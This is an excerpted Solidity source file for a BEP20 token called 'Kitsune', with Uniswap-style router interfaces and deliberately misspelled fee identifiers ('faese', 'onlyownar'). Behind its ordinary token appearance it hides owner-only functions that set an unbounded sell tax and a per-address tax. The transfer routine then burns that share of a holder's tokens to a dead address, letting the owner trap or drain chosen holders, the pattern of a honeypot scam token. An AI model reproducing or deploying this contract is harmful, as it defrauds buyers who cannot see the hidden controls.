...
interface IUniswapV2Factory {
    ...
    function faeseTo() external view returns (address);
    function faeseToSetter() external view returns (address);
    ...
    function setfaeseTo(address) external;
    function setfaeseToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfaeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfaeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfaeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfaeseOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfaeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Kitsune is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfaese = 0;

    uint256 private _defaultBuyfaese = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfaese;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfaese = _value;
    }

    function setSlipfaese(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfaese[_address] = _value;
    }

    function getSlipfaese(address _address) external view onlyownar returns (uint256) {
        return _slipfaese[_address];
    }


    function setMAccountfaese(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfaese(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefaeseAmount = 0;

        if (rF) {
            uint256 tradefaese = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefaese = _defaultSellfaese;
                }
                if (from == uniswapV2Pair) {

                    tradefaese = _defaultBuyfaese;
                }
            }
            if (_slipfaese[from] > 0) {
                tradefaese = _slipfaese[from];
            }

            tradefaeseAmount = _Amount.mul(tradefaese).div(100);
        }


        if (tradefaeseAmount > 0) {
            _balances[from] = _balances[from].sub(tradefaeseAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefaeseAmount);
            emit Transfer(from, _deadAddress, tradefaeseAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefaeseAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefaeseAmount);
        emit Transfer(from, _to, _Amount - tradefaeseAmount);
    }
